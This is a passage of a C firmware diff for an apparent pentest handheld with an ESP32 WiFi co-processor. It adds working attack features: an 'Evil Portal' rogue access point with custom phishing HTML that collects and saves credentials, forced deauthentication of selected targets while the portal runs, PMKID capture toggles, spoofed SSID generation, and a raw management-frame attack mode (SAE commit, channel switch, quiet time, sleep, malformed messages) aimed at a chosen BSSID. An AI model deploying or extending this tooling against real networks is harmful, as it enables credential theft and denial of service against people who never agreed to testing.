+			wifi_portal_ssid[sizeof(wifi_portal_ssid) - 1] = '\0';
+			if (wifi_portal_ssid[0] == '\0')
+			{
+				strcpy(wifi_portal_ssid, "Free WiFi");
+			}
+		}
+		else if (strncmp(p, "html=", 5) == 0)
+		{
+			strncpy(wifi_portal_html_path, p + 5, sizeof(wifi_portal_html_path) - 1);
+			wifi_portal_html_path[sizeof(wifi_portal_html_path) - 1] = '\0';
+			wifi_portal_name_from_path(wifi_portal_html_path,
+				wifi_portal_html_name, sizeof(wifi_portal_html_name));
+		}
+	}
+	f_close(&fil);
+}
+
+static void wifi_portal_cfg_save(void)
+{
+	FIL fil;
+	UINT bw;
+	char line[180];
+	int len;
+
+	f_mkdir(WIFI_AP_CACHE_DIR);
+	if (f_open(&fil, WIFI_PORTAL_CFG_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
+	{
+		return;
+	}
+
+	len = snprintf(line, sizeof(line), "ssid=%s\r\nhtml=%s\r\n",
+		wifi_portal_ssid, wifi_portal_html_path);
+	if (len > 0)
+	{
+		f_write(&fil, line, len, &bw);
+	}
+	f_close(&fil);
 }
 
 static void wifi_sanitize_field(char *dst, const char *src, size_t dst_len)
@@ -2589,6 +3268,121 @@ static void wifi_csv_quote_field(char *dst, const char *src, size_t dst_len)
 	}
 	dst[di++] = '"';
 	dst[di] = '\0';
+}
+
+void wifi_general_status(void)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	BaseType_t ret;
+	char ln[26];
+
+	wifi_portal_cfg_load();
+
+	m1_u8g2_firstpage();
+	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
+	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
+	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "WIFI STATUS");
+
+	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+	snprintf(ln, sizeof(ln), "APs:%u Sel:%u", ap_count, wifi_selected_ap_count());
+	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
+	snprintf(ln, sizeof(ln), "STAs:%u Sel:%u", sta_total, wifi_selected_sta_count());
+	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
+	snprintf(ln, sizeof(ln), "SSIDs:%u", beacon_file_count);
+	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
+	snprintf(ln, sizeof(ln), "HTML:%s",
+		wifi_portal_html_path[0] ? "Custom" : "Built-in");
+	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
+	u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK]Exit");
+	m1_u8g2_nextpage();
+
+	while (1)
+	{
+		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
+		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
+		{
+			xQueueReceive(button_events_q_hdl, &btn, 0);
+			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				xQueueReset(main_q_hdl);
+				break;
+			}
+		}
+	}
+}
+
+void wifi_general_capture_status(void)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	BaseType_t ret;
+	char ln[26];
+
+	wifi_capture_cfg_load();
+
+	while (1)
+	{
+		m1_u8g2_firstpage();
+		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
+		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
+		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
+			"MARAUDER CFG");
+
+		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+		snprintf(ln, sizeof(ln), "SavePCAP:%s", wifi_onoff(wifi_capture_cfg.save_pcap));
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
+		snprintf(ln, sizeof(ln), "ForcePMKID:%s", wifi_onoff(wifi_capture_cfg.force_pmkid));
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
+		snprintf(ln, sizeof(ln), "ForceProbe:%s", wifi_onoff(wifi_capture_cfg.force_probe));
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
+		snprintf(ln, sizeof(ln), "EPDeauth:%s", wifi_onoff(wifi_capture_cfg.ep_deauth));
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
+		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK]Exit");
+		m1_u8g2_nextpage();
+
+		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
+		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
+		{
+			xQueueReceive(button_events_q_hdl, &btn, 0);
+			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				xQueueReset(main_q_hdl);
+				break;
+			}
+		}
+	}
+}
+
+static void wifi_capture_toggle(bool *field, const char *title)
+{
+	char line[26];
+
+	wifi_capture_cfg_load();
+	*field = !*field;
+	wifi_capture_cfg_save();
+	snprintf(line, sizeof(line), "%s", wifi_onoff(*field));
+	wifi_show_message(title, line, WIFI_CAPTURE_CFG_FILE);
+}
+
+void wifi_general_toggle_save_pcap(void)
+{
+	wifi_capture_toggle(&wifi_capture_cfg.save_pcap, "SavePCAP");
+}
+
+void wifi_general_toggle_force_pmkid(void)
+{
+	wifi_capture_toggle(&wifi_capture_cfg.force_pmkid, "ForcePMKID");
+}
+
+void wifi_general_toggle_force_probe(void)
+{
+	wifi_capture_toggle(&wifi_capture_cfg.force_probe, "ForceProbe");
+}
+
+void wifi_general_toggle_ep_deauth(void)
+{
+	wifi_capture_toggle(&wifi_capture_cfg.ep_deauth, "EPDeauth");
 }
 
 #define WIFI_WARDRIVE_AP_FILE      "wifi/wardrive_aps.csv"
@@ -2850,6 +3644,41 @@ void wifi_general_select_aps(void)
 	}
 }
 
+void wifi_general_select_all_aps(void)
+{
+	char ln[26];
+
+	if (!ap_list || ap_count == 0)
+	{
+		wifi_show_message("Select All APs", "No AP cache", "Scan or Load APs");
+		return;
+	}
+
+	for (uint16_t i = 0; i < ap_count; i++)
+	{
+		ap_list[i].selected = true;
+	}
+
+	snprintf(ln, sizeof(ln), "Selected %u APs", ap_count);
+	wifi_show_message("Select All APs", ln, NULL);
+}
+
+void wifi_general_clear_ap_selection(void)
+{
+	if (!ap_list || ap_count == 0)
+	{
+		wifi_show_message("Clear AP Sel", "No AP cache", "Scan or Load APs");
+		return;
+	}
+
+	for (uint16_t i = 0; i < ap_count; i++)
+	{
+		ap_list[i].selected = false;
+	}
+
+	wifi_show_message("Clear AP Sel", "AP selection clear", NULL);
+}
+
 void wifi_general_select_stations(void)
 {
 	S_M1_Buttons_Status btn;
@@ -2894,6 +3723,41 @@ void wifi_general_select_stations(void)
 			}
 		}
 	}
+}
+
+void wifi_general_select_all_stations(void)
+{
+	char ln[26];
+
+	if (!sta_list_data || sta_total == 0)
+	{
+		wifi_show_message("Select All Stations", "No station cache", "Scan Stations first");
+		return;
+	}
+
+	for (uint16_t i = 0; i < sta_total; i++)
+	{
+		sta_list_data[i].selected = true;
+	}
+
+	snprintf(ln, sizeof(ln), "Selected %u STAs", sta_total);
+	wifi_show_message("Select All Stations", ln, NULL);
+}
+
+void wifi_general_clear_station_selection(void)
+{
+	if (!sta_list_data || sta_total == 0)
+	{
+		wifi_show_message("Clear Sta Sel", "No station cache", "Scan Stations first");
+		return;
+	}
+
+	for (uint16_t i = 0; i < sta_total; i++)
+	{
+		sta_list_data[i].selected = false;
+	}
+
+	wifi_show_message("Clear Sta Sel", "STA selection clear", NULL);
 }
 
 static void wifi_draw_ap_info(void)
@@ -3126,6 +3990,293 @@ void wifi_general_clear_aps(void)
 	wifi_show_message("Clear APs", "AP cache cleared", NULL);
 }
 
+void wifi_general_save_stations(void)
+{
+	FIL fil;
+	UINT bw;
+	char line[WIFI_AP_CACHE_LINE_MAX];
+	char ssid[33];
+
+	if (!sta_list_data || sta_total == 0)
+	{
+		wifi_show_message("Save Stations", "No station cache", "Scan Stations first");
+		return;
+	}
+
+	f_mkdir(WIFI_AP_CACHE_DIR);
+	if (f_open(&fil, WIFI_STA_CACHE_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
+	{
+		wifi_show_message("Save Stations", "File open failed", NULL);
+		return;
+	}
+
+	const char *hdr = "# mac\tbssid\tchannel\trssi\tssid\r\n";
+	f_write(&fil, hdr, strlen(hdr), &bw);
+	for (uint16_t i = 0; i < sta_total; i++)
+	{
+		wifi_sanitize_field(ssid, sta_list_data[i].ssid, sizeof(ssid));
+		int len = snprintf(line, sizeof(line),
+			"%s\t%02X:%02X:%02X:%02X:%02X:%02X\t%d\t%d\t%s\r\n",
+			sta_list_data[i].mac_str,
+			sta_list_data[i].bssid[0], sta_list_data[i].bssid[1],
+			sta_list_data[i].bssid[2], sta_list_data[i].bssid[3],
+			sta_list_data[i].bssid[4], sta_list_data[i].bssid[5],
+			sta_list_data[i].channel, sta_list_data[i].rssi, ssid);
+		if (len > 0)
+		{
+			f_write(&fil, line, len, &bw);
+		}
+	}
+	f_close(&fil);
+
+	snprintf(line, sizeof(line), "Saved %d STAs", sta_total);
+	wifi_show_message("Save Stations", line, WIFI_STA_CACHE_FILE);
+}
+
+void wifi_general_load_stations(void)
+{
+	S_M1_file_info *f_info;
+	FIL fil;
+	char path[128];
+	char line[WIFI_AP_CACHE_LINE_MAX];
+	wifi_sta_t *new_list;
+	uint16_t new_count = 0;
+
+	f_info = storage_browse();
+	if (!f_info || !f_info->file_is_selected)
+	{
+		return;
+	}
+
+	if (!wifi_ext_is_ap_cache(f_info->file_name))
+	{
+		wifi_show_message("Load Stations", "Use .tsv/.txt", "Station cache");
+		return;
+	}
+
+	if (!beacon_make_fullpath(f_info, path, sizeof(path)))
+	{
+		wifi_show_message("Load Stations", "Bad path", NULL);
+		return;
+	}
+
+	if (f_open(&fil, path, FA_READ) != FR_OK)
+	{
+		wifi_show_message("Load Stations", "File open failed", NULL);
+		return;
+	}
+
+	new_list = (wifi_sta_t *)malloc(STA_MAX * sizeof(wifi_sta_t));
+	if (!new_list)
+	{
+		f_close(&fil);
+		wifi_show_message("Load Stations", "No memory", NULL);
+		return;
+	}
+	memset(new_list, 0, STA_MAX * sizeof(wifi_sta_t));
+
+	while (new_count < STA_MAX && f_gets(line, sizeof(line), &fil) != NULL)
+	{
+		char *mac_s;
+		char *bssid_s;
+		char *ch_s;
+		char *rssi_s;
+		char *ssid_s;
+		wifi_sta_t *sta;
+
+		mac_s = beacon_trim_line(line);
+		if (mac_s[0] == '\0' || mac_s[0] == '#' || mac_s[0] == ';')
+		{
+			continue;
+		}
+
+		bssid_s = strchr(mac_s, '\t');
+		if (!bssid_s) continue;
+		*bssid_s++ = '\0';
+		ch_s = strchr(bssid_s, '\t');
+		if (!ch_s) continue;
+		*ch_s++ = '\0';
+		rssi_s = strchr(ch_s, '\t');
+		if (!rssi_s) continue;
+		*rssi_s++ = '\0';
+		ssid_s = strchr(rssi_s, '\t');
+		if (!ssid_s) continue;
+		*ssid_s++ = '\0';
+
+		sta = &new_list[new_count];
+		if (!wifi_parse_bssid(mac_s, sta->mac) || !wifi_parse_bssid(bssid_s, sta->bssid))
+		{
+			continue;
+		}
+		wifi_format_mac(sta->mac, sta->mac_str, sizeof(sta->mac_str));
+		sta->channel = (uint8_t)atoi(ch_s);
+		sta->rssi = (int8_t)atoi(rssi_s);
+		strncpy(sta->ssid, ssid_s, 32);
+		sta->ssid[32] = '\0';
+		new_count++;
+	}
+	f_close(&fil);
+
+	if (new_count == 0)
+	{
+		free(new_list);
+		wifi_show_message("Load Stations", "No STAs loaded", NULL);
+		return;
+	}
+
+	sta_list_free();
+	sta_list_data = new_list;
+	sta_total = new_count;
+	sta_view_idx = 0;
+
+	snprintf(line, sizeof(line), "Loaded %d STAs", sta_total);
+	wifi_show_message("Load Stations", line, NULL);
+}
+
+void wifi_general_clear_stations(void)
+{
+	sta_list_free();
+	wifi_show_message("Clear Stations", "Station cache clear", NULL);
+}
+
+static bool wifi_ssid_pool_add_one(const char *ssid)
+{
+	m1_cmd_t cmd;
+	m1_resp_t resp;
+	uint8_t len;
+	int ret;
+
+	if (!ssid || ssid[0] == '\0')
+	{
+		return false;
+	}
+
+	len = (uint8_t)strnlen(ssid, 32);
+	memset(&cmd, 0, sizeof(cmd));
+	cmd.magic = M1_CMD_MAGIC;
+	cmd.cmd_id = CMD_SSID_ADD;
+	memcpy(cmd.payload, ssid, len);
+	cmd.payload[len] = '\0';
+	cmd.payload_len = len + 1;
+
+	ret = m1_esp32_send_cmd(&cmd, &resp, 1000);
+	return (ret == 0 && resp.status == RESP_OK);
+}
+
+void wifi_general_add_ssid(void)
+{
+	char ssid[33] = {0};
+	char ln[26];
+
+	ensure_esp32_ready();
+
+	if (beacon_file_count >= BEACON_LIST_MAX_SSIDS)
+	{
+		wifi_show_message("Add SSID", "Local list full", "Save or Clear");
+		return;
+	}
+
+	if (m1_vkb_get_text("SSID:", "", ssid, 32) == 0)
+	{
+		return;
+	}
+
+	if (ssid[0] == '\0')
+	{
+		wifi_show_message("Add SSID", "Empty SSID", NULL);
+		return;
+	}
+
+	if (beacon_ssid_exists(beacon_file_count, ssid))
+	{
+		wifi_show_message("Add SSID", "Already in list", ssid);
+		return;
+	}
+
+	if (!wifi_ssid_pool_add_one(ssid))
+	{
+		wifi_show_message("Add SSID", "Add failed", "Flash ESP32 FW?");
+		return;
+	}
+
+	size_t len = strnlen(ssid, 32);
+	memcpy(beacon_file_ssids[beacon_file_count], ssid, len);
+	beacon_file_ssids[beacon_file_count][len] = '\0';
+	beacon_file_ptrs[beacon_file_count] = beacon_file_ssids[beacon_file_count];
+	beacon_file_count++;
+
+	snprintf(ln, sizeof(ln), "SSIDs:%u", beacon_file_count);
+	wifi_show_message("Add SSID", "Added", ln);
+}
+
+void wifi_general_generate_ssids(void)
+{
+	static const char *prefixes[] = {"M1", "Guest", "FreeWiFi", "Router"};
+	beacon_load_diag_t load_diag;
+	uint32_t seed;
+	uint8_t total;
+	char ln[26];
+
+	ensure_esp32_ready();
+
+	memset(beacon_file_ssids, 0, sizeof(beacon_file_ssids));
+	memset(beacon_file_ptrs, 0, sizeof(beacon_file_ptrs));
+	beacon_file_count = BEACON_RANDOM_PICK_N;
+	seed = HAL_GetTick() ^ 0xA5365A5Au;
+
+	for (uint8_t i = 0; i < beacon_file_count; i++)
+	{
+		seed = beacon_list_random_next(&seed);
+		snprintf(beacon_file_ssids[i], sizeof(beacon_file_ssids[i]), "%s-%04lX",
+			prefixes[i % 4], (unsigned long)(seed & 0xFFFFu));
+		beacon_file_ptrs[i] = beacon_file_ssids[i];
+	}
+
+	total = beacon_batch_load(beacon_file_ptrs, beacon_file_count, &load_diag);
+	if (total == 0)
+	{
+		beacon_load_failed_screen("Generate SSIDs", &load_diag);
+		HAL_Delay(2000);
+		return;
+	}
+
+	snprintf(ln, sizeof(ln), "Generated %u", total);
+	wifi_show_message("Generate SSIDs", ln, "ESP32 pool ready");
+}
+
+void wifi_general_save_ssids(void)
+{
+	FIL fil;
+	UINT bw;
+	char line[48];
+
+	if (beacon_file_count == 0)
+	{
+		wifi_show_message("Save SSIDs", "No local SSIDs", "Load/Add first");
+		return;
+	}
+
+	f_mkdir(WIFI_AP_CACHE_DIR);
+	if (f_open(&fil, WIFI_SSID_LIST_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
+	{
+		wifi_show_message("Save SSIDs", "File open failed", NULL);
+		return;
+	}
+
+	for (uint8_t i = 0; i < beacon_file_count; i++)
+	{
+		int len = snprintf(line, sizeof(line), "%s\r\n", beacon_file_ssids[i]);
+		if (len > 0)
+		{
+			f_write(&fil, line, len, &bw);
+		}
+	}
+	f_close(&fil);
+
+	snprintf(line, sizeof(line), "Saved %u SSIDs", beacon_file_count);
+	wifi_show_message("Save SSIDs", line, WIFI_SSID_LIST_FILE);
+}
+
 void wifi_general_load_ssids(void)
 {
 	S_M1_file_info *f_info;
@@ -3180,6 +4331,9 @@ void wifi_general_clear_ssids(void)
 		return;
 	}
 
+	memset(beacon_file_ssids, 0, sizeof(beacon_file_ssids));
+	memset(beacon_file_ptrs, 0, sizeof(beacon_file_ptrs));
+	beacon_file_count = 0;
 	wifi_show_message("Clear SSIDs", "SSID pool cleared", NULL);
 }
 
@@ -3585,6 +4739,7 @@ void wifi_general_set_ep_ssid(void)
 {
 	char new_ssid[33];
 
+	wifi_portal_cfg_load();
 	memset(new_ssid, 0, sizeof(new_ssid));
 	if (m1_vkb_get_text("Portal SSID:", wifi_portal_ssid, new_ssid, 32) == 0)
 	{
@@ -3593,17 +4748,21 @@ void wifi_general_set_ep_ssid(void)
 
 	strncpy(wifi_portal_ssid, new_ssid, sizeof(wifi_portal_ssid) - 1);
 	wifi_portal_ssid[sizeof(wifi_portal_ssid) - 1] = '\0';
+	if (wifi_portal_ssid[0] == '\0')
+	{
+		strcpy(wifi_portal_ssid, "Free WiFi");
+	}
+	wifi_portal_cfg_save();
 	wifi_show_message("Portal SSID", "Saved", wifi_portal_ssid);
 }
 
-void wifi_general_select_ep_html(void)
+static bool wifi_portal_upload_html_path(const char *path, const char *display_name,
+	bool show_success)
 {
-	S_M1_file_info *f_info;
 	FIL fil;
 	FRESULT fr;
 	m1_cmd_t cmd;
 	m1_resp_t resp;
-	char path[128];
 	char line[26];
 	char file_line[26];
 	uint8_t buf[EP_HTML_CHUNK_BYTES];
@@ -3611,36 +4770,24 @@ void wifi_general_select_ep_html(void)
 	UINT br = 0;
 	int ret;
 
-	f_info = storage_browse();
-	if (!f_info || !f_info->file_is_selected)
+	if (!path || path[0] == '\0')
 	{
-		return;
-	}
-
-	if (!wifi_ext_is_html(f_info->file_name))
-	{
-		wifi_show_message("EP HTML", "Use .html/.htm", NULL);
-		return;
-	}
-
-	if (!beacon_make_fullpath(f_info, path, sizeof(path)))
-	{
-		wifi_show_message("EP HTML", "Bad file path", NULL);
-		return;
+		wifi_show_message("EP HTML", "No file selected", NULL);
+		return false;
 	}
 
 	fr = f_open(&fil, path, FA_READ);
 	if (fr != FR_OK)
 	{
 		wifi_show_message("EP HTML", "Open failed", NULL);
-		return;
+		return false;
 	}
 
 	if (f_size(&fil) > EP_HTML_MAX_BYTES)
 	{
 		f_close(&fil);
 		wifi_show_message("EP HTML", "File too large", "Max 32KB");
-		return;
+		return false;
 	}
 
 	ensure_esp32_ready();
@@ -3649,10 +4796,10 @@ void wifi_general_select_ep_html(void)
 	{
 		f_close(&fil);
 		wifi_show_message("EP HTML", "Clear failed", "Flash ESP32 FW?");
-		return;
+		return false;
 	}
 
-	snprintf(file_line, sizeof(file_line), "%.24s", f_info->file_name);
+	snprintf(file_line, sizeof(file_line), "%.24s", display_name ? display_name : "portal.html");
 	wifi_show_message("EP HTML", "Uploading...", file_line);
 
 	while (1)
@@ -3663,7 +4810,7 @@ void wifi_general_select_ep_html(void)
 			m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
 			f_close(&fil);
 			wifi_show_message("EP HTML", "Read failed", NULL);
-			return;
+			return false;
 		}
 
 		if (br == 0)
@@ -3683,7 +4830,7 @@ void wifi_general_select_ep_html(void)
 			m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
 			f_close(&fil);
 			wifi_show_message("EP HTML", "Upload failed", "Flash ESP32 FW?");
-			return;
+			return false;
 		}
 
 		total += br;
@@ -3695,11 +4842,96 @@ void wifi_general_select_ep_html(void)
 	{
 		m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
 		wifi_show_message("EP HTML", "Empty file", NULL);
+		return false;
+	}
+
+	if (show_success)
+	{
+		snprintf(line, sizeof(line), "Loaded %lu bytes", (unsigned long)total);
+		wifi_show_message("EP HTML", line, "Ready for portal");
+	}
+	return true;
+}
+
+void wifi_general_select_ep_html(void)
+{
+	S_M1_file_info *f_info;
+	char path[128];
+
+	wifi_portal_cfg_load();
+	f_info = storage_browse();
+	if (!f_info || !f_info->file_is_selected)
+	{
 		return;
 	}
 
-	snprintf(line, sizeof(line), "Loaded %lu bytes", (unsigned long)total);
-	wifi_show_message("EP HTML", line, "Ready for portal");
+	if (!wifi_ext_is_html(f_info->file_name))
+	{
+		wifi_show_message("EP HTML", "Use .html/.htm", NULL);
+		return;
+	}
+
+	if (!beacon_make_fullpath(f_info, path, sizeof(path)))
+	{
+		wifi_show_message("EP HTML", "Bad file path", NULL);
+		return;
+	}
+
+	if (!wifi_portal_upload_html_path(path, f_info->file_name, true))
+	{
+		return;
+	}
+
+	strncpy(wifi_portal_html_path, path, sizeof(wifi_portal_html_path) - 1);
+	wifi_portal_html_path[sizeof(wifi_portal_html_path) - 1] = '\0';
+	strncpy(wifi_portal_html_name, f_info->file_name, sizeof(wifi_portal_html_name) - 1);
+	wifi_portal_html_name[sizeof(wifi_portal_html_name) - 1] = '\0';
+	wifi_portal_cfg_save();
+}
+
+void wifi_general_reload_ep_html(void)
+{
+	wifi_portal_cfg_load();
+	if (wifi_portal_html_path[0] == '\0')
+	{
+		wifi_show_message("Reload HTML", "No saved HTML", "Pick EP HTML File");
+		return;
+	}
+
+	wifi_portal_upload_html_path(wifi_portal_html_path, wifi_portal_html_name, true);
+}
+
+void wifi_general_clear_ep_html(void)
+{
+	m1_resp_t resp;
+	int ret;
+
+	wifi_portal_cfg_load();
+	ensure_esp32_ready();
+	ret = m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
+	if (ret != 0 || resp.status != RESP_OK)
+	{
+		wifi_show_message("Clear HTML", "Clear failed", "Flash ESP32 FW?");
+		return;
+	}
+
+	wifi_portal_html_path[0] = '\0';
+	wifi_portal_html_name[0] = '\0';
+	wifi_portal_cfg_save();
+	wifi_show_message("Clear HTML", "Built-in portal", "will be used");
+}
+
+void wifi_general_ep_html_status(void)
+{
+	wifi_portal_cfg_load();
+	if (wifi_portal_html_path[0] == '\0')
+	{
+		wifi_show_message("HTML Status", "Built-in portal", "No custom file");
+		return;
+	}
+
+	wifi_show_message("HTML Status", wifi_portal_html_name[0] ?
+		wifi_portal_html_name : "Custom HTML", "Saved on SD");
 }
 
 
@@ -3777,8 +5009,22 @@ void wifi_evil_portal(void)
 	char ln[26];
 	uint32_t start_tick, last_poll;
 	const char *portal_ssid = wifi_portal_ssid;
+	bool force_deauth_started = false;
+	uint8_t force_targets = 0;
 
+	wifi_portal_cfg_load();
+	wifi_capture_cfg_load();
+	portal_ssid = wifi_portal_ssid;
 	ensure_esp32_ready();
+
+	if (wifi_portal_html_path[0] != '\0')
+	{
+		if (!wifi_portal_upload_html_path(wifi_portal_html_path,
+			wifi_portal_html_name, false))
+		{
+			wifi_show_message("Evil Portal", "Using built-in", "HTML load failed");
+		}
+	}
 
 	/* Start portal */
 	memset(&cmd, 0, sizeof(cmd));
@@ -3805,6 +5051,11 @@ void wifi_evil_portal(void)
 		m1_u8g2_nextpage();
 		HAL_Delay(2000);
 		return;
+	}
+
+	if (wifi_capture_cfg.ep_deauth)
+	{
+		force_deauth_started = wifi_force_deauth_start(&resp, &force_targets);
 	}
 
 	ep_cred_count = 0;
@@ -3838,6 +5089,12 @@ void wifi_evil_portal(void)
 		snprintf(ln, sizeof(ln), "Creds: %d  Time:%lus", ep_cred_count, elapsed);
 		u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
 
+		if (force_deauth_started)
+		{
+			snprintf(ln, sizeof(ln), "EPDeauth:%d targets", force_targets);
+			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
+		}
+
 		if (ep_cred_count > 0)
 		{
 			uint8_t vi = ep_view_idx;
@@ -3862,6 +5119,7 @@ void wifi_evil_portal(void)
 			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
 			{
 				ep_save_creds_to_sd();
+				wifi_force_deauth_stop(force_deauth_started);
 				m1_esp32_simple_cmd(CMD_PORTAL_STOP, &resp, 2000);
 				xQueueReset(main_q_hdl);
 				break;
@@ -3952,6 +5210,198 @@ void wifi_probe_flood(void)
 	}
 }
 
+/*============================================================================*/
+/*  Raw WiFi Management Attack UI                                             */
+/*============================================================================*/
+
+#define WIFI_RAW_ATK_SAE_COMMIT   0
+#define WIFI_RAW_ATK_CHAN_SWITCH  1
+#define WIFI_RAW_ATK_QUIET_TIME   2
+#define WIFI_RAW_ATK_SLEEP        3
+#define WIFI_RAW_ATK_BAD_MSG      4
+
+static bool wifi_raw_attack_first_selected_ap(uint16_t *idx_out)
+{
+	if (!ap_list || ap_count == 0)
+	{
+		return false;
+	}
+
+	for (uint16_t i = 0; i < ap_count; i++)
+	{
+		if (ap_list[i].selected && wifi_mac_is_nonzero(ap_list[i].bssid) &&
+			ap_list[i].channel > 0)
+		{
+			if (idx_out) *idx_out = i;
+			return true;
+		}
+	}
+
+	return false;
+}
+
+static void wifi_raw_attack_run_ap(uint8_t mode, const char *title, wifi_ap_t *ap)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	BaseType_t ret;
+	m1_cmd_t cmd;
+	m1_resp_t resp;
+	char ln[26];
+	uint32_t start_tick;
+	int spi_ret;
+
+	if (!ap || !wifi_mac_is_nonzero(ap->bssid) || ap->channel == 0)
+	{
+		wifi_show_message(title, "Bad target", "Need BSSID/channel");
+		return;
+	}
+
+	memset(&cmd, 0, sizeof(cmd));
+	cmd.magic = M1_CMD_MAGIC;
+	cmd.cmd_id = CMD_WIFI_RAW_ATTACK_START;
+	cmd.payload[0] = mode;
+	cmd.payload[1] = ap->channel;
+	memcpy(&cmd.payload[2], ap->bssid, 6);
+	uint8_t sl = (uint8_t)strnlen(ap->ssid, 32);
+	if (sl > 32) sl = 32;
+	cmd.payload[8] = sl;
+	if (sl > 0) memcpy(&cmd.payload[9], ap->ssid, sl);
+	cmd.payload_len = 9 + sl;
+
+	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
+	if (spi_ret != 0 || resp.status != RESP_OK)
+	{
+		wifi_show_message(title, "Start failed", "Flash ESP32 FW?");
+		return;
+	}
+
+	start_tick = HAL_GetTick();
+	while (1)
+	{
+		uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;
+
+		m1_u8g2_firstpage();
+		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
+		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
+		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, title);
+
+		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+		snprintf(ln, sizeof(ln), "CH:%u Time:%lus", ap->channel, elapsed);
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
+		snprintf(ln, sizeof(ln), "%.24s", ap->ssid[0] ? ap->ssid : "*hidden*");
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
+		snprintf(ln, sizeof(ln), "%02X:%02X:%02X:%02X:%02X:%02X",
+			ap->bssid[0], ap->bssid[1], ap->bssid[2],
+			ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, "Mgmt frames active");
+		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
+		m1_u8g2_nextpage();
+
+		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
+		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
+		{
+			xQueueReceive(button_events_q_hdl, &btn, 0);
+			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				m1_esp32_simple_cmd(CMD_WIFI_RAW_ATTACK_STOP, &resp, 1000);
+				xQueueReset(main_q_hdl);
+				break;
+			}
+		}
+	}
+}
+
+static void wifi_raw_attack_target_ui(uint8_t mode, const char *title)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	BaseType_t ret;
+	uint16_t list_count;
+	uint16_t selected_idx;
+
+	ensure_esp32_ready();
+
+	if (wifi_raw_attack_first_selected_ap(&selected_idx))
+	{
+		wifi_raw_attack_run_ap(mode, title, &ap_list[selected_idx]);
+		return;
+	}
+
+	if (!ap_list || ap_count == 0)
+	{
+		wifi_show_message(title, "Scanning APs...", NULL);
+		list_count = wifi_do_scan();
+	}
+	else
+	{
+		list_count = ap_count;
+	}
+
+	if (!list_count)
+	{
+		wifi_show_message(title, "No AP targets", NULL);
+		return;
+	}
+
+	wifi_ap_list_print(true);
+	while (1)
+	{
+		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
+		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
+		{
+			xQueueReceive(button_events_q_hdl, &btn, 0);
+			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				xQueueReset(main_q_hdl);
+				break;
+			}
